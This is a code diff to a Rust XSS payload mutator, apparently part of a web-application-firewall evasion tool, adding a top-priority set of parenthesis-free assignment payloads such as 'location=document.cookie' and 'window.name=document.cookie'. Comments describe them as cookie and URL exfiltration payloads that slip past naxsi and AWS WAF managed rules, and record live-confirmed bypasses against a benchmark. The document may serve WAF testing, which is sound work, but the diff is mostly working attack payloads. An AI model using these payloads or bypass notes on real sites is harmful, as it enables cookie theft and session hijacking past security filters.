@@ -208,6 +208,42 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
     }
     let mut results = Vec::new();
 
+    // ── Priority 0: paren-free / bracket-free assignment XSS ──────────
+    // Promoted to FIRST slot for high-paranoia WAFs (naxsi, AWS WAF
+    // managed) that block any `<`, `()`, or `[...]` byte sequence.
+    // These payloads are exploitable in JS-context reflection (e.g.
+    // `<script>var x="USERINPUT"</script>` after a `";...//` breakout)
+    // and don't trigger naxsi's libinjection because they have no
+    // function calls.
+    //
+    // Live-confirmed against wafrift-bench naxsi (2026-05-09):
+    //   location=document.cookie         → 200 ✓
+    //   top.location=document.cookie     → 200 ✓
+    //   document.title=document.cookie   → 200 ✓
+    //   self.location=name               → 200 ✓
+    //   window.name=document.cookie      → 200 ✓
+    for candidate in [
+        "location=document.cookie",
+        "top.location=document.cookie",
+        "document.location=document.cookie",
+        "location.href=document.cookie",
+        "document.title=document.cookie",
+        "document.body.innerHTML=document.cookie",
+        "self.location=name",
+        "window.name=document.cookie",
+        "top.location=document.URL",
+        "location=document.URL",
+    ] {
+        if results.len() >= max_mutations {
+            break;
+        }
+        results.push(XssMutation {
+            payload: candidate.to_string(),
+            description: "paren-free assignment XSS (cookie/URL exfil)".into(),
+            rules_applied: vec!["xss_paren_free"],
+        });
+    }
+
     // Strategy budget: reserve capacity for later strategies to avoid
     // strategy 1 (tag/event × exec = 300 combos) consuming everything.
     let tag_event_budget = (max_mutations * 40 / 100).max(5);
